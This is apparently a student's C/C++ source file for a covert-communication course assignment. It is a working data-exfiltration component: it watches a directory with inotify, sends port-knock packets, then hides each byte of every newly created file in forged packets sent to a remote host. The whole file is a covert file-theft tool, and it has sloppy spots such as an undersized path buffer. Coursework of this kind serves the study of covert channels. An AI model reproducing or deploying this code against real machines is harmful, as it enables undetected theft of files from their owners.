/*******************************************************************************
**
**  Author:   Mario Enriquez,   A00909441
**  Class:    COMP_8505
**  Title:    Final Assignment, Covert Communication
**
**  Notes:
**        -Based on the code from Rowland and Aman Abdullah
**
*******************************************************************************/

#include "headers.h"
#include <sys/inotify.h>
#include <sys/select.h>

#define TRUE 1
#define FALSE 0
#define EVENT_SIZE (sizeof (struct inotify_event))
#define BUF_LEN	(1024 * (EVENT_SIZE + 16))
#define ALL_MASK 0xffffffff

// Globals - volatile qualifier tells compiler that variable can be modified asynchronously during program execution
static volatile sig_atomic_t doneflag = FALSE;

void forgepacket(char[],char[],int,char*, int, int[]);


static void set_done_flag (int signo)
{
	doneflag = TRUE;
}

void send_file(char *dir,char *f,char *src_host,char *dst_host,int ports[]){
	//Sends a file to specified host and port
	FILE *fp;
	char buffer[5000],filedir[strlen(dir) + strlen(f)];
	char payload[2],end[2];
	int n,i;
	int flags[6] = {0,0,0,1,1,0};
	memset(buffer,0,sizeof(buffer));
	strcpy(filedir,dir);
	strcat(filedir,f);
	sleep(1);
	fp = fopen(filedir,"r");
	if (fp==NULL)
		cout << "Error opening file" << endl;
	else{
		strcpy(buffer,f);
		n=strlen(f)+1;
		buffer[n] = '|';
	  do {
			n++;
	    buffer[n] = fgetc (fp);
			cout << buffer [n];
	  } while (buffer[n] != EOF);
	}

	flags[1]=0;
	flags[3]=1;
	flags[4]=1;
	forgepacket(src_host,dst_host,ports[2],payload,1232,flags); //First knock
  sleep(1);
  forgepacket(src_host,dst_host,ports[3],payload,1232,flags); //Second Knock
  sleep(1);
  forgepacket(src_host,dst_host,ports[4],payload,1232,flags); // Third Knock
	sleep(1);
	for(i=0;i<n;i++){ //Send all the bytes in the file
		flags[1]=1;
		flags[3]=0;
		flags[4]=0;
		buffer[i]+=10;
		forgepacket(src_host,dst_host,ports[5],payload,(buffer[i]-'0'),flags);
		sleep(1);
	}
	end[0]='1';
	forgepacket(src_host,dst_host,ports[5],end,(buffer[0]-'0'),flags); //Sends EOF or thread gets stuck
	flags[1]=0;
	flags[3]=1;
	flags[4]=1;
	forgepacket(src_host,dst_host,ports[2],payload,1232,flags);
	fclose(fp);
}

void print_mask(int mask){
		//Flag arised from Directory changes
        if (mask & IN_ACCESS)
                printf("ACCESS ");
        if (mask & IN_MODIFY)
                printf("MODIFY ");
        if (mask & IN_ATTRIB)
                printf("ATTRIB ");
        if (mask & IN_CLOSE)
                printf("CLOSE ");
        if (mask & IN_OPEN)
                printf("OPEN ");
        if (mask & IN_MOVED_FROM)
                printf("MOVE_FROM ");
        if (mask & IN_MOVED_TO)
                printf("MOVE_TO ");
        if (mask & IN_DELETE)
                printf("DELETE ");
        if (mask & IN_CREATE)
                printf("CREATE ");
        if (mask & IN_DELETE_SELF)
                printf("DELETE_SELF ");
        if (mask & IN_UNMOUNT)
                printf("UNMOUNT ");
        if (mask & IN_Q_OVERFLOW)
                printf("Q_OVERFLOW ");
        if (mask & IN_IGNORED)
                printf("IGNORED " );

        if (mask & IN_ISDIR)
                printf("(dir) ");
        else
                printf("(file) ");

        printf("0x%08x\n", mask);
}


void exfilt_main (char *dir,char *src_host,char *dst_host,int ports[])
{
	int len, i, ret, fd, wd;
	struct timeval time;
	static struct inotify_event *event;
	fd_set rfds;
	char buf[BUF_LEN];
	struct sigaction act;

	// time out after 10 seconds
	time.tv_sec = 10;
	time.tv_usec = 0;

	fd = inotify_init();
	if (fd < 0)
		perror ("inotify_init");

	wd = inotify_add_watch (fd, dir, (uint32_t)IN_CREATE);

	if (wd < 0)
		perror ("inotify_add_watch");

	FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

	// set up the signal handler
	/*act.sa_handler = set_done_flag;
	act.sa_flags = 0;
	if ((sigemptyset (&act.sa_mask) == -1 || sigaction (SIGINT, &act, NULL) == -1))
	{
		perror ("Failed to set SIGINT handler");
		exit (EXIT_FAILURE);
	}*/

	while (!doneflag)
	{
		ret = select (fd + 1, &rfds, NULL, NULL, NULL);
		len = read (fd, buf, BUF_LEN);

		i = 0;
		if (len < 0){
      if (errno == EINTR) /* need to reissue system call */
				perror ("read");
      else
        perror ("read");
		}
		else if (!len) {
			// BUF_LEN too small?
			printf ("buffer too small!\n");
			exit (1);
		}

		while (i < len){
      //struct inotify_event *event;
      event = (struct inotify_event *) &buf[i];

      if (event->len)
      	send_file(dir,event->name,src_host,dst_host,ports);//We get the file to send and start sending it
      i += EVENT_SIZE + event->len;
		}

		if (ret < 0)
			cout << "select" << endl;
		else if (!ret)
			cout << "timed out" << endl;
		else if (FD_ISSET (fd, &rfds))
		{
			//cout << (event->mask);
		}
	}

	printf ("Cleaning up and Terminating....................\n");
	fflush (stdout);
	ret = inotify_rm_watch (fd, wd);
	if (ret)
		perror ("inotify_rm_watch");
	if (close(fd))
		perror ("close");
}
